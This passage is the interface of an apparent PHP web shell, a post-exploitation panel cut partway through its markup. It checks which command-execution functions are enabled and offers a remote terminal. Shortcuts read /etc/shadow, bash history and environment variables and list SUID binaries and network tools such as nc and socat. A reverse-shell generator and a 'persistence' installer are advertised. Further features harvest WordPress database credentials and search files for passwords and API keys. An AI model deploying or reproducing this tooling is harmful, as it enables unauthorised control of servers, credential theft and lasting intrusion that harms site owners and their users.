    <!-- ======== VIEW: FILES ======== -->
    <section class="view active" id="view-files">
      <?php
      $available_methods = [];
      $disabled_funcs = explode(',', ini_get('disable_functions'));
      if (function_exists('shell_exec') && !in_array('shell_exec', $disabled_funcs)) $available_methods[] = 'shell_exec';
      if (function_exists('exec') && !in_array('exec', $disabled_funcs)) $available_methods[] = 'exec';
      if (function_exists('system') && !in_array('system', $disabled_funcs)) $available_methods[] = 'system';
      if (function_exists('passthru') && !in_array('passthru', $disabled_funcs)) $available_methods[] = 'passthru';
      if (function_exists('proc_open') && !in_array('proc_open', $disabled_funcs)) $available_methods[] = 'proc_open';
      if (function_exists('popen') && !in_array('popen', $disabled_funcs)) $available_methods[] = 'popen';
      $exec_status = count($available_methods) > 0 ? 'Shell: ' . implode(', ', $available_methods) : 'Shell: Disabled';
      ?>
      <div class="server-info-bar">
        <div class="highlight"><?php echo htmlspecialchars($user_info) ?></div>
        <strong>Server:</strong> <?php echo htmlspecialchars($server_info) ?><br>
        <strong>Software:</strong> <?php echo htmlspecialchars($software_info) ?> &nbsp; <strong>PHP:</strong> <?php echo htmlspecialchars($php_version) ?><br>
        <strong>Path:</strong> <?php echo htmlspecialchars($dir) ?> &nbsp; <strong>IP:</strong> <?php echo htmlspecialchars($server_ip) ?><br>
        <span class="badge <?php echo count($available_methods) > 0 ? 'on' : 'off'; ?>"><i></i><?php echo $exec_status; ?></span>
      </div>

      <div class="panel" style="margin-bottom:8px;">
        <div style="padding:5px 10px;border-bottom:1px solid var(--border);">
          <div class="crumbs" id="breadcrumbs" style="font-size:11.5px;"><?php echo generate_breadcrumbs($dir) ?></div>
        </div>
        <div style="padding:5px 10px;display:flex;gap:6px;align-items:center;">
          <form method="post" id="navigateForm" style="display:flex;gap:6px;flex:1;">
            <input type="hidden" name="action" value="navigate_to_dir">
            <input type="text" name="target_dir" id="targetDirInput" value="<?php echo htmlspecialchars($dir) ?>" style="flex:1;background:var(--bg-input);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:4px 8px;font-size:11.5px;outline:none;">
            <button type="submit" class="btn small">Go</button>
          </form>
          <button class="btn small ghost" onclick="goToDefaultDirectory()">Default</button>
          <button class="btn small ghost" onclick="loadAndShowServerInfo()">Info</button>
        </div>
      </div>

      <div id="fmClipboardBar" class="fm-clipboard-bar">
        <span>📋 Clipboard: <strong id="fmClipboardInfo">-</strong></span>
        <button class="btn small" onclick="fmPaste()">Paste Here</button>
        <button class="btn small ghost" onclick="fmClearClipboard()">Clear</button>
      </div>

      <div class="panel">
        <div class="table-wrap">
          <?php echo list_dir($dir) ?>
        </div>
      </div>

      <div class="output-area" id="outputArea"><?php echo htmlspecialchars($output) ?></div>

      <div class="fm-bottom-grid">
        <!-- Upload -->
        <div class="panel">
          <div class="panel-head" style="padding:6px 12px;font-size:12px;">UPLOAD</div>
          <div class="panel-body" style="padding:8px;">
            <form method="post" enctype="multipart/form-data" id="uploadForm">
              <label id="dropZone" class="drop-zone" for="uploadFileInput">
                <span class="drop-label">Browse / Drop Files Here</span>
                <input type="file" name="upload_file[]" id="uploadFileInput" class="d-none" multiple>
                <div class="drop-file-list" id="dropFileList"></div>
              </label>
              <button type="submit" id="uploadSubmitBtn" class="btn small" style="width:100%;margin-top:6px;" disabled>Upload <span id="fileCount">0</span></button>
            </form>
          </div>
        </div>

        <!-- Create -->
        <div class="panel">
          <div class="panel-head" style="padding:6px 12px;font-size:12px;">CREATE</div>
          <div class="panel-body" style="padding:8px;">
            <form method="post" id="createForm" style="display:flex;flex-direction:column;gap:6px;">
              <div style="display:flex;gap:6px;">
                <input type="text" name="create_name" placeholder="name" style="flex:1;background:var(--bg-input);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:5px 8px;font-size:11.5px;">
                <select name="create_type" id="createType" onchange="toggleCreateContent()" style="background:var(--bg-input);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:5px 6px;font-size:11.5px;width:70px;">
                  <option value="file">File</option>
                  <option value="dir">Dir</option>
                </select>
              </div>
              <div id="createOptions" class="chk-row" style="font-size:11.5px;">
                <label><input type="radio" name="create_mode" value="empty" checked onchange="toggleCreateContent()"> Empty</label>
                <label><input type="radio" name="create_mode" value="content" onchange="toggleCreateContent()"> Content</label>
              </div>
              <textarea name="create_content" id="createContent" placeholder="File content..." class="hidden" style="min-height:60px;background:var(--bg-input);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:6px 8px;font-size:11.5px;"></textarea>
              <button type="submit" class="btn small">Create</button>
            </form>
          </div>
        </div>
      </div>

      <!-- Terminal -->
      <div class="panel fm-terminal-card" style="margin-top:8px;">
        <div class="panel-head" style="padding:6px 12px;font-size:12px;justify-content:space-between;">
          <span>TERMINAL</span>
          <button type="button" class="btn small ghost" onclick="document.getElementById('fmTermOutput').value=''" style="padding:2px 8px;font-size:10.5px;">Clear</button>
        </div>
        <div class="panel-body" style="padding:8px;">
          <textarea id="fmTermOutput" readonly class="fm-term-output" placeholder="Output will appear here..."></textarea>
          <form id="fmTermForm" style="display:flex;gap:6px;margin-top:6px;">
            <span class="fm-term-prompt">$</span>
            <input type="text" id="fmTermInput" placeholder="Enter command..." autocomplete="off" class="fm-term-input">
            <button type="submit" class="btn small">Run</button>
          </form>
        </div>
      </div>
    </section>

    <!-- ======== VIEW: SHELL ======== -->
    <section class="view" id="view-shell">
      <div class="section-title">COMMAND EXECUTION</div>
      <div class="panel" style="margin-bottom:16px;">
        <div class="panel-body">
          <form id="shellForm" style="display:flex;gap:8px;">
            <input type="text" id="shellCmdInput" name="cmd" placeholder="Enter command..." style="flex:1;background:var(--bg-input);border:1px solid var(--border);border-radius:5px;color:var(--primary);padding:8px 12px;font-size:14px;outline:none;">
            <button type="submit" class="btn">Execute</button>
          </form>
        </div>
      </div>
      <div class="shell-container">
        <div class="shell-left">
          <div style="font-size:11.5px;color:var(--text-dim);letter-spacing:1px;margin-bottom:10px;">SHORTCUTS</div>
          <div class="shortcut-item" onclick="setShellCommand('id && whoami && groups')" ondblclick="execShellDirect('id && whoami && groups')"><code>id && whoami && groups</code><span class="shortcut-desc">Identity info</span></div>
          <div class="shortcut-item" onclick="setShellCommand('uname -a')" ondblclick="execShellDirect('uname -a')"><code>uname -a</code><span class="shortcut-desc">Kernel info</span></div>
          <div class="shortcut-item" onclick="setShellCommand('cat /etc/passwd')" ondblclick="execShellDirect('cat /etc/passwd')"><code>cat /etc/passwd</code><span class="shortcut-desc">Users list</span></div>
          <div class="shortcut-item" onclick="setShellCommand('cat /etc/shadow 2>/dev/null')" ondblclick="execShellDirect('cat /etc/shadow 2>/dev/null')"><code>cat /etc/shadow</code><span class="shortcut-desc">Shadow file</span></div>
          <div class="shortcut-item" onclick="setShellCommand('sudo -l 2>/dev/null')" ondblclick="execShellDirect('sudo -l 2>/dev/null')"><code>sudo -l</code><span class="shortcut-desc">Sudo rights</span></div>
          <div class="shortcut-item" onclick="setShellCommand('netstat -tulpn 2>/dev/null || ss -tulpn')" ondblclick="execShellDirect('netstat -tulpn 2>/dev/null || ss -tulpn')"><code>netstat -tulpn</code><span class="shortcut-desc">Open ports</span></div>
          <div class="shortcut-item" onclick="setShellCommand('ip a || ifconfig')" ondblclick="execShellDirect('ip a || ifconfig')"><code>ip a</code><span class="shortcut-desc">Network interfaces</span></div>
          <div class="shortcut-item" onclick="setShellCommand('ps aux')" ondblclick="execShellDirect('ps aux')"><code>ps aux</code><span class="shortcut-desc">Running processes</span></div>
          <div class="shortcut-item" onclick="setShellCommand('find / -perm -4000 -type f 2>/dev/null')" ondblclick="execShellDirect('find / -perm -4000 -type f 2>/dev/null')"><code>find / -perm -4000</code><span class="shortcut-desc">SUID files</span></div>
          <div class="shortcut-item" onclick="setShellCommand('getcap -r / 2>/dev/null')" ondblclick="execShellDirect('getcap -r / 2>/dev/null')"><code>getcap -r /</code><span class="shortcut-desc">File capabilities</span></div>
          <div class="shortcut-item" onclick="setShellCommand('crontab -l 2>/dev/null && ls -la /etc/cron*')" ondblclick="execShellDirect('crontab -l 2>/dev/null && ls -la /etc/cron*')"><code>crontab -l</code><span class="shortcut-desc">Cron jobs</span></div>
          <div class="shortcut-item" onclick="setShellCommand('find / -writable -type d 2>/dev/null | head -20')" ondblclick="execShellDirect('find / -writable -type d 2>/dev/null | head -20')"><code>find / -writable</code><span class="shortcut-desc">Writable dirs</span></div>
          <div class="shortcut-item" onclick="setShellCommand('ls -la /root/ 2>/dev/null')" ondblclick="execShellDirect('ls -la /root/ 2>/dev/null')"><code>ls -la /root/</code><span class="shortcut-desc">Root home</span></div>
          <div class="shortcut-item" onclick="setShellCommand('cat ~/.bash_history 2>/dev/null | tail -50')" ondblclick="execShellDirect('cat ~/.bash_history 2>/dev/null | tail -50')"><code>bash_history</code><span class="shortcut-desc">Command history</span></div>
          <div class="shortcut-item" onclick="setShellCommand('env')" ondblclick="execShellDirect('env')"><code>env</code><span class="shortcut-desc">Environment vars</span></div>
          <div class="shortcut-item" onclick="setShellCommand('find / -name *.conf -o -name *.cfg -o -name *.ini 2>/dev/null | head -30')" ondblclick="execShellDirect('find / -name *.conf -o -name *.cfg -o -name *.ini 2>/dev/null | head -30')"><code>find configs</code><span class="shortcut-desc">Config files</span></div>
          <div class="shortcut-item" onclick="setShellCommand('cat /etc/os-release 2>/dev/null')" ondblclick="execShellDirect('cat /etc/os-release 2>/dev/null')"><code>os-release</code><span class="shortcut-desc">OS info</span></div>
          <div class="shortcut-item" onclick="setShellCommand('which python python3 perl ruby gcc nc ncat socat curl wget 2>/dev/null')" ondblclick="execShellDirect('which python python3 perl ruby gcc nc ncat socat curl wget 2>/dev/null')"><code>which interpreters</code><span class="shortcut-desc">Available tools</span></div>
          <div class="shortcut-item" onclick="setShellCommand('ls -la /var/www/ /srv/http/ /home/*/public_html/ 2>/dev/null')" ondblclick="execShellDirect('ls -la /var/www/ /srv/http/ /home/*/public_html/ 2>/dev/null')"><code>ls web dirs</code><span class="shortcut-desc">Web directories</span></div>
        </div>
        <div class="shell-right">
          <div class="term" id="shellOutput" style="height:100%;min-height:400px;max-height:none;">
            <div class="ln"><span class="caret"></span> Awaiting command...</div>
          </div>
        </div>
      </div>
    </section>

    <!-- ======== VIEW: TOOLS ======== -->
    <section class="view" id="view-tools">
      <div class="section-title">SYSTEM TOOLS</div>
      <div class="tool-grid">
        <div class="tool-card" onclick="openModal('cronModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/></svg></div>
          <h3>Crontab Editor</h3><p>Manage cron jobs and scheduled tasks</p>
          <div class="tags"><span class="tag">cron</span><span class="tag">schedule</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('firewallModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2 4 6v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V6l-8-4Z"/></svg></div>
          <h3>Firewall</h3><p>Check firewall status and rules</p>
          <div class="tags"><span class="tag">iptables</span><span class="tag">ufw</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('hashModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 9h16M4 15h16M10 3v18M14 3v18"/></svg></div>
          <h3>Hash Calculator</h3><p>Hash text and files with multiple algorithms</p>
          <div class="tags"><span class="tag">md5</span><span class="tag">sha256</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('kernelModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M9 1v3M15 1v3M9 20v3M15 20v3M20 9h3M20 14h3M1 9h3M1 14h3"/></svg></div>
          <h3>Kernel Protection</h3><p>Check ASLR, SELinux, and kernel security</p>
          <div class="tags"><span class="tag">aslr</span><span class="tag">selinux</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('logsModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z"/><path d="M14 2v6h6"/><path d="M16 13H8M16 17H8M10 9H8"/></svg></div>
          <h3>Logs Viewer</h3><p>Browse and read system log files</p>
          <div class="tags"><span class="tag">syslog</span><span class="tag">auth</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('permModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
          <h3>Permissions</h3><p>Track file permissions and find denied errors</p>
          <div class="tags"><span class="tag">chmod</span><span class="tag">tracker</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('portModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="2"/><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg></div>
          <h3>Port Scanner</h3><p>Scan ports and list open connections</p>
          <div class="tags"><span class="tag">nmap</span><span class="tag">scan</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('sshModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m21 2-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.78 7.78 5.5 5.5 0 0 1 7.78-7.78Zm0 0L15.5 7.5m0 0 3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg></div>
          <h3>SSH Key Gen</h3><p>Generate SSH key pairs</p>
          <div class="tags"><span class="tag">ed25519</span><span class="tag">rsa</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('suidModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 2h9l5 5v13a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2Z"/><path d="M14 2v6h6"/></svg></div>
          <h3>SUID/SGID</h3><p>Scan for SUID and SGID binaries</p>
          <div class="tags"><span class="tag">suid</span><span class="tag">sgid</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('sessionModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></svg></div>
          <h3>Session</h3><p>Manage PHP session info</p>
          <div class="tags"><span class="tag">session</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('revshellModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m8 12 4 4 4-4"/><path d="M12 8v8"/></svg></div>
          <h3>Rev Shell</h3><p>Generate reverse shell payloads</p>
          <div class="tags"><span class="tag">bash</span><span class="tag">python</span><span class="tag">nc</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('serviceModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="6" rx="1.5"/><rect x="3" y="14" width="18" height="6" rx="1.5"/><circle cx="7" cy="7" r="1" fill="currentColor" stroke="none"/><circle cx="7" cy="17" r="1" fill="currentColor" stroke="none"/></svg></div>
          <h3>Services</h3><p>Manage system services (systemd)</p>
          <div class="tags"><span class="tag">systemctl</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('ftpModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 14.899A7 7 0 1 1 15.71 8h1.79a4.5 4.5 0 0 1 2.5 8.242"/><path d="M12 12v9"/><path d="m8 17 4 4 4-4"/></svg></div>
          <h3>FTP Manager</h3><p>Manage FTP users, connections, and config</p>
          <div class="tags"><span class="tag">ftp</span><span class="tag">vsftpd</span></div>
          <div class="launch">OPEN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
      </div>
    </section>

    <!-- ======== VIEW: DATABASE ======== -->
    <section class="view" id="view-database">
      <div class="section-title">DATABASE TOOLS</div>
      <div class="tool-grid" style="grid-template-columns:repeat(2,1fr);gap:10px;">
        <div class="tool-card" onclick="exploreDatabase()">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/></svg></div>
          <h3>Explore WordPress DB</h3><p>Auto-detect wp-config.php and explore database</p>
          <div class="tags"><span class="tag">wp-config</span><span class="tag">auto</span></div>
          <div class="launch">SCAN<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
        <div class="tool-card" onclick="openModal('dbConnectModal')">
          <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83"/><circle cx="12" cy="12" r="4"/></svg></div>
          <h3>Manual Connect</h3><p>Connect to any database with custom credentials</p>
          <div class="tags"><span class="tag">mysql</span><span class="tag">manual</span></div>
          <div class="launch">CONNECT<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 5l7 7-7 7"/></svg></div>
        </div>
      </div>
    </section>

    <!-- ======== VIEW: PRIVESC ======== -->
    <section class="view" id="view-privesc">
      <div class="section-title">PRIVILEGE ESCALATION</div>
      <div class="tool-grid" style="margin-bottom:20px;">
        <div class="tool-card" onclick="runSuidScan()">
          <h3>SUID Files</h3><p>Find SUID/SGID bit files</p>
        </div>
        <div class="tool-card" onclick="runSudoScan()">
          <h3>Sudo Rights</h3><p>Check sudo permissions</p>
        </div>
        <div class="tool-card" onclick="runCapScan()">
          <h3>Capabilities</h3><p>Scan Linux capabilities</p>
        </div>
        <div class="tool-card" onclick="runSymlinkScan()">
          <h3>Symlinks</h3><p>Detect symlink vulns</p>
        </div>
        <div class="tool-card" onclick="runPermsScan()">
          <h3>Permissions</h3><p>Unusual permission configs</p>
        </div>
        <div class="tool-card" onclick="openModal('privescPersistModal')">
          <h3>Persistence</h3><p>Install persistence mechanisms</p>
        </div>
      </div>

      <div class="panel" style="margin-bottom:16px;">
        <div class="panel-head" style="cursor:pointer;" onclick="toggleScanOptions()">SCAN CONFIGURATION</div>
        <div id="scanOptionsPanel" style="display:none;" class="panel-body">
          <div class="row-inline" style="margin-bottom:8px;">
            <div class="field"><label>Scan Directory</label><input type="text" id="scanDir" placeholder="Auto-detect"></div>
            <div class="field"><label>Max Depth</label><input type="number" id="scanDepth" value="5"></div>
          </div>
          <div class="row-inline" style="margin-bottom:8px;">
            <div class="field"><label>Max Files</label><input type="number" id="scanMaxFiles" value="5000"></div>
            <div class="field"><label>Min Size</label><input type="number" id="scanMinSize" value="0"></div>
            <div class="field"><label>Max Size</label><input type="number" id="scanMaxSize" value="500000"></div>
          </div>
          <div id="breadcrumbNav" style="margin-bottom:8px;padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:5px;">
            <span id="breadcrumbPath" style="font-size:11.5px;color:var(--text-dim);"></span>
          </div>
          <button class="btn" onclick="runScanShells()">Run Shell Scanner</button>
        </div>
      </div>

      <div id="privescResults" class="panel" style="display:none;">
        <div class="panel-head">RESULTS</div>
        <div class="panel-body">
          <div id="privescOutput" style="background:#000;border:1px solid var(--border);border-radius:6px;padding:12px;font-size:11.5px;color:var(--primary);white-space:pre-wrap;max-height:500px;overflow-y:auto;"></div>
        </div>
      </div>
    </section>

    <!-- ======== VIEW: SEARCH ======== -->
    <section class="view" id="view-search">
      <div class="section-title">FILE SEARCH</div>
      <div class="search-layout">
        <div class="search-sidebar">
          <form id="searchForm" style="display:flex;flex-direction:column;gap:10px;">
            <div class="field"><label>Search Term</label><input type="text" name="search_term" id="searchTermInput" placeholder="Enter search term..."></div>
            <div style="margin-bottom:4px;">
              <label style="font-size:11.5px;color:var(--text-dim);display:block;margin-bottom:6px;">Search Type:</label>
              <div style="display:flex;gap:6px;">
                <label style="flex:1;display:flex;align-items:center;gap:4px;padding:8px 10px;border:1px solid var(--border);border-radius:5px;cursor:pointer;font-size:11.5px;color:var(--text-dim);"><input type="radio" name="search_type" value="filename" checked> Filename</label>
                <label style="flex:1;display:flex;align-items:center;gap:4px;padding:8px 10px;border:1px solid var(--border);border-radius:5px;cursor:pointer;font-size:11.5px;color:var(--text-dim);"><input type="radio" name="search_type" value="content"> Content</label>
              </div>
            </div>
            <div style="padding:8px 10px;background:var(--bg);border-radius:var(--radius);">
              <label style="font-size:11.5px;color:var(--text-dim);display:flex;align-items:center;cursor:pointer;"><input type="checkbox" name="search_root" id="searchRootCheckbox" style="margin-right:8px;"> Search from root (/)</label>
            </div>
            <button type="submit" class="btn" style="width:100%;padding:10px;font-size:14px;font-weight:bold;">Search</button>
          </form>
        </div>
        <div class="search-main">
          <div id="searchResultsContent" style="font-size:12px;">
            <div style="text-align:center;padding:40px 20px;color:var(--text-dim);">
              <h3 style="color:var(--primary);margin:8px 0;">File Search</h3>
              <p>Masukkan kata kunci di panel kiri, lalu klik "Search"</p>
              <div style="margin-top:12px;text-align:left;padding:10px;background:var(--bg);border-radius:var(--radius);font-size:12px;">
                <p style="color:var(--primary);margin-bottom:8px;"><strong>Tips:</strong></p>
                <p style="color:var(--text-dim);margin:4px 0;"><strong>Filename:</strong> Cari file berdasarkan nama</p>
                <p style="color:var(--text);margin:2px 0 2px 12px;">wp-config.php, .htaccess, index.php</p>
                <p style="color:var(--text-dim);margin:8px 0 4px;"><strong>Content:</strong> Cari isi file</p>
                <p style="color:var(--text);margin:2px 0 2px 12px;">password, DB_HOST, api_key</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ======== VIEW: DISCOVER ======== -->
    <section class="view" id="view-discover">
      <div class="section-title">WEBSITE DISCOVERY</div>
      <div class="panel">
        <div class="panel-body">
          <button class="btn" onclick="discoverWebsites()" style="width:100%;">Discover Websites</button>
        </div>
      </div>
      <div id="discoverResultsArea" style="margin-top:16px;"></div>
    </section>

  </div><!-- /content -->
</div><!-- /main -->
</div><!-- /app -->

<!-- ==================== BOTTOM NAV ==================== -->
<nav class="bottom-nav">
  <div class="swipe-dots" id="swipe-dots">
    <i data-dot="files"></i><i data-dot="shell"></i><i data-dot="tools"></i><i data-dot="database"></i><i data-dot="privesc"></i><i data-dot="search"></i><i data-dot="discover"></i>
  </div>
  <div class="bottom-nav-inner">
    <button class="bn-item" data-view="files"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7Z"/></svg><span>Files</span></button>
    <button class="bn-item" data-view="shell"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg><span>Shell</span></button>
    <button class="bn-item" data-view="tools"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.7 6.3a4 4 0 0 0-5.4 5.4L3 18l3 3 6.3-6.3a4 4 0 0 0 5.4-5.4l-2.6 2.6-2-2 2.6-2.6Z"/></svg><span>Tools</span></button>
    <button class="bn-item" data-view="privesc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2 4 6v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V6l-8-4Z"/></svg><span>Privesc</span></button>
    <button class="bn-item" data-view="search"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/></svg><span>Search</span></button>
  </div>
</nav>

<!-- ==================== MODALS ==================== -->
<!-- View Modal -->
<div class="modal-overlay" id="viewModal"><div class="modal modal--full">
  <div class="modal-head"><h3 id="viewTitle">View File</h3><div style="display:flex;gap:8px;"><button class="btn small" onclick="copyToClipboard('viewContent')">Copy</button><button class="modal-close" onclick="closeModal('viewModal')">&times;</button></div></div>
  <div class="modal-body"><pre id="viewContent" style="white-space:pre-wrap;color:var(--text);font-size:12px;">Loading...</pre></div>
  <div class="modal-foot"><button class="btn" id="viewEditBtn" onclick="switchToEditMode()">Edit</button><button class="btn ghost" onclick="closeModal('viewModal')">Close</button></div>
</div></div>

<!-- Edit Modal -->
<div class="modal-overlay" id="editModal"><div class="modal modal--full">
  <div class="modal-head"><h3 id="editTitle">Edit File</h3><button class="modal-close" onclick="closeModal('editModal')">&times;</button></div>
  <form method="post">
    <div class="modal-body"><input type="hidden" name="edit_file" id="editFile"><textarea name="file_content" id="editContent" style="width:100%;height:100%;min-height:400px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:5px;padding:10px;font-size:12px;resize:vertical;"></textarea></div>
    <div class="modal-foot"><button type="submit" name="save_edit" class="btn" id="editSaveBtn">Save</button><button type="button" class="btn ghost" onclick="closeModal('editModal')">Cancel</button></div>
  </form>
</div></div>

<!-- Rename Modal -->
<div class="modal-overlay" id="renameModal"><div class="modal modal--sm">
  <div class="modal-head"><h3 id="renameTitle">Rename</h3><button class="modal-close" onclick="closeModal('renameModal')">&times;</button></div>
  <form method="post">
    <div class="modal-body"><input type="hidden" name="rename_target" id="renameTarget"><div class="field"><label>New Name</label><input type="text" name="new_name" placeholder="New name"></div></div>
    <div class="modal-foot"><button type="submit" class="btn">Rename</button><button type="button" class="btn ghost" onclick="closeModal('renameModal')">Cancel</button></div>
  </form>
</div></div>

<!-- Chmod Modal -->
<div class="modal-overlay" id="chmodModal"><div class="modal modal--sm">
  <div class="modal-head"><h3 id="chmodTitle">Change Permissions</h3><button class="modal-close" onclick="closeModal('chmodModal')">&times;</button></div>
  <form id="chmodForm" method="post">
    <div class="modal-body">
      <input type="hidden" name="action" value="chmod"><input type="hidden" name="chmod_target" id="chmodTarget">
      <div class="field" style="margin-bottom:10px;"><label>Permissions</label>
        <select name="chmod_perm" id="chmodPermSelect"><option value="755">755 (rwxr-xr-x)</option><option value="644">644 (rw-r--r--)</option><option value="777">777 (rwxrwxrwx)</option><option value="600">600 (rw-------)</option><option value="750">750 (rwxr-x---)</option><option value="custom">Custom...</option></select>
      </div>
      <div id="customPermDiv" class="hidden" style="margin-bottom:10px;"><div class="field"><label>Custom Value</label><input type="text" name="custom_perm" id="customPermInput" placeholder="755"></div></div>
